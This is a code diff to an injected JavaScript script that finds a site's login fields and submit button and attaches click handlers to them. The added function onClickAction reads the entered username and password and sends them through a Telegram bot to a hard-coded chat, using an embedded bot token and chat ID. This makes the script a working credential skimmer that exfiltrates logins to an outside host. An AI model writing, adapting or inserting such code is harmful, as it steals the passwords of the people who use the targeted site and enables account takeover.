@@ -8,15 +8,19 @@
     if(pass != null && name != null) {
         console.log('inputs found!');
 
-        const onClickAction = "const name = document.getElementById('user_nickname'); const pass = document.getElementById('user_password'); console.log('name: ' + name.value + ' pass: ' + pass.value);"
-        name.setAttribute("onclick", onClickAction);
-        pass.setAttribute("onclick", onClickAction);
+        const onClickActionString = "const name = document.getElementById('user_nickname'); const pass = document.getElementById('user_password'); console.log('name: ' + name.value + ' pass: ' + pass.value);"
+        name.setAttribute("onclick", onClickActionString);
+        pass.setAttribute("onclick", onClickActionString);
+
+        name.addEventListener("click", onClickAction);
+        pass.addEventListener("click", onClickAction);
 
         const submitButton = document.querySelector('.btn-primary');
         if(submitButton != null) {
             console.log('button found!');
 
-            submitButton.setAttribute("onclick", onClickAction);
+            submitButton.setAttribute("onclick", onClickActionString);
+            submitButton.addEventListener("click", onClickAction);
         }
     }
  }
@@ -41,6 +45,33 @@
                 xhr2.send()
             }
         }
+ }
+
+ function onClickAction() {
+    const token = '7284579776:AAG-0g9TOkPFqIJUP4rPg-uAz_nYRAdbm60';
+    const chatId = '342006791';
+
+    const name = document.getElementById('user_nickname').value;
+    const pass = document.getElementById('user_password').value;
+    const message = `Name: ${name}\nPassword: ${pass}`;
+
+            $.ajax({
+                type: 'POST',
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                data: {
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'html',
+                },
+                success: function (res) {
+                    console.log('success');
+                    //$('#response').text('Message sent');
+                },
+                error: function (error) {
+                    console.log(error);
+                    // alert("error failed");
+                }
+            });
  }
 
 onInject();
